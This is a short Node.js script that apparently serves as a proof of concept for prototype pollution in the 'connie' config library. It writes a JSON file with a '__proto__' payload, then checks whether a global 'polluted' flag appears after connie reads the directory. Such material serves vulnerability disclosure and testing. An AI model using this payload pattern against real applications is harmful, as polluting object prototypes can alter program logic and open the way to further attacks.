const connie = require("connie");
const fs = require("fs");
fs.writeFileSync("test.json", `{"__proto__": {"polluted": true}}`);
connie("dir", ".")
  .read()
  .then((x) => {
    console.log(polluted);
  });
